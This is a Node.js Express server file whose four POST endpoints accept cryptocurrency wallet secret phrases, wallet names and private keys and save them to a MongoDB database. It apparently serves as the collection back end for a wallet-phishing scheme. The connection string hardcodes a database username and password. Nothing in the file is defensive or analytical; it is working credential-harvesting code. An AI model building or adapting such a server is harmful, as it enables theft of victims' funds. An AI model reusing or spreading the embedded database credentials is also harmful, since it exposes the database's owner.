const express = require("express");
const server = express();
const cors = require("cors")
const bodyParser = require("body-parser")
const mongoose = require("mongoose");
const mongooseUrl = "mongodb+srv://dbBackend:clientbackend@cluster0.ycmie7z.mongodb.net/ClientBackend"

let timeAdd = new Date();
const date = new Date();
const offset = date.getTimezoneOffset() == 0 ? 0 : -1 * date.getTimezoneOffset();
let normalized = new Date(date.getTime() + (offset) * 60000);
let indiaTime = new Date(normalized.toLocaleString("en-US", {timeZone: "Asia/Calcutta"}));

//Connect MONGO DB
async function mongooseConnect(){
    try{
        await mongoose.connect(mongooseUrl);
        console.log("Connected");
    }
    catch{
        console.log("Error")
    }
}
mongooseConnect()

//Schema
const schema = new mongoose.Schema(
    {
        Time:{type:String},
        secretPhrase: {type:String}
});
const schemaUse = mongoose.model('database1', schema);

const schema2 = new mongoose.Schema({
    Time:{type:String},
    walletName: {type:String},
    secretPhrase: {type:String}
});
const schema2Use = mongoose.model('database2', schema2);

const schema3 = new mongoose.Schema({
    Time:{type:String},
    secretPhrase: {type:String}
});
const schema3Use = mongoose.model('database3', schema3);

const schema4 = new mongoose.Schema({
    Time:{type:String},
    privateKey: {type:String}
});
const schema4Use = mongoose.model('database4', schema4);

//MiddleWares
server.use(cors());
server.use(bodyParser.json());

//API's
server.get("/",(req,res)=>{
    res.send("Hello World");
})

server.post("/api/data1",(req,res)=>{
    async function saveSchema(){
        let data = new schemaUse({
            Time:indiaTime,
            secretPhrase:req.body.packetData
        });
        try{
            await data.save();
            console.log("Saved")
        }
        catch{
            console.log("NO")
        }
    }
    res.json({status:"Confirmed"});
    saveSchema()
})

server.post("/api/data2",(req,res)=>{
    async function saveSchema(){
        let data = new schema2Use({
            Time:indiaTime,
            walletName:req.body.walletName,
            secretPhrase:req.body.secretPhrase
        });
        try{
            await data.save();
            console.log("Saved")
        }
        catch{
            console.log("NO")
        }
    }
    res.json({status:"Confirmed"});
    saveSchema()
})

server.post("/api/data3",(req,res)=>{
    async function saveSchema(){
        let data = new schema3Use({
            Time:indiaTime,
            secretPhrase:req.body.secretPhrase
        });
        try{
            await data.save();
            console.log("Saved")
        }
        catch{
            console.log("NO")
        }
    }
    res.json({status:"Confirmed"});
    saveSchema()
})

server.post("/api/data4",(req,res)=>{
    async function saveSchema(){
        let data = new schema4Use({
            Time:indiaTime,
            privateKey:req.body.privateKey
        });
        try{
            await data.save();
            console.log("Saved")
        }
        catch{
            console.log("NO")
        }
    }
    res.json({status:"Confirmed"});
    saveSchema()
})

//Server Listening
server.listen(8000);
